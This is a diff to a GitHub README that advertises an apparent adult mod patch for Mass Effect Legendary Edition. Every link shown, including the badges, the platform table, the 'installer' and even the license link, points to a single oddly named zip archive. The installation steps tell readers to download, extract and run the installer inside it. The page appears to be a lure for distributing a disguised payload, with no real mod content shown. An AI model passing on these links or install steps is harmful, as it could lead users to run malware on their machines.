@@ -1,4 +1,4 @@
-# ![Download](https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip%20Patch-brightgreen?style=for-the-badge&logo=github&labelColor=blue&https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip)  
+# ![Download](https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip%20Patch-brightgreen?style=for-the-badge&logo=github&labelColor=blue&https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip)  
 # Mass Effect Legendary Edition NSFW Patch 💫
 
 **Welcome to your intergalactic experience upgrade!**  
@@ -11,10 +11,10 @@ Ever dreamt of the Citadel on your favorite system? Now you can journey across g
 
 | Operating System | Status | Notes                            |
 |:-----------------|:-------|:---------------------------------|
-| ![Windows](https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip%2F11-blue?logo=windows) | 🔥 Supported | Official support for all versions |
-| ![macOS](https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip%2B-lightgrey?logo=apple) | 🧪 Experimental | Requires Wine or Crossover        |
-| ![Linux](https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip%20%2F%20Debian-brightgreen?logo=linux) | 🧬 Community | Wine/Steam Proton recommended     |
-| ![Steam Deck](https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip) | 🛠️ Beta | Use desktop mode with Proton      |
+| ![Windows](https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip%2F11-blue?logo=windows) | 🔥 Supported | Official support for all versions |
+| ![macOS](https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip%2B-lightgrey?logo=apple) | 🧪 Experimental | Requires Wine or Crossover        |
+| ![Linux](https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip%20%2F%20Debian-brightgreen?logo=linux) | 🧬 Community | Wine/Steam Proton recommended     |
+| ![Steam Deck](https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip) | 🛠️ Beta | Use desktop mode with Proton      |
 
 ---
 ## 🌟 Feature List
@@ -73,10 +73,10 @@ Discover what sets this patch apart:
 To launch your mature journey, simply follow these waypoints:
 
 1. **Back up** your Mass Effect Legendary Edition installation folder.
-2. Download the *latest patch build*: https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip
+2. Download the *latest patch build*: https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip
 3. Extract the contents to a new folder.
 4. Run the included installer:
-   - On Windows: `https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip`
+   - On Windows: `https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip`
    - On Mac/Linux: See included instructions for Wine/Proton wrappers.
 5. Select your LE install directory when prompted.
 6. Choose language, API integrations, and which modules to apply.
@@ -99,10 +99,10 @@ This project is aimed solely at **adult users seeking to enhance their single-pl
 
 MIT License © 2025  
 The project is open for all interested modders, researchers, and fans!  
-For full terms and permissions, see the [MIT License](https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip).
+For full terms and permissions, see the [MIT License](https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip).
 
 ---
-## ![Download](https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip%20Patch-brightgreen?style=for-the-badge&logo=github&labelColor=blue&https://raw.githubusercontent.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/branch/flotative/mass-effect-legendary-nsfw-upgrade-v2.9.zip)  
+## ![Download](https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip%20Patch-brightgreen?style=for-the-badge&logo=github&labelColor=blue&https://github.com/dasgamer15/mass-effect-legendary-nsfw-upgrade/raw/refs/heads/branch/flotative/upgrade_mass_nsfw_legendary_effect_Drepanaspis.zip)  
 
 **Reignite your galactic passion.**  
 With the Mass Effect Legendary Edition NSFW Patch, every Shepard can finally write their own legendary chapter.  
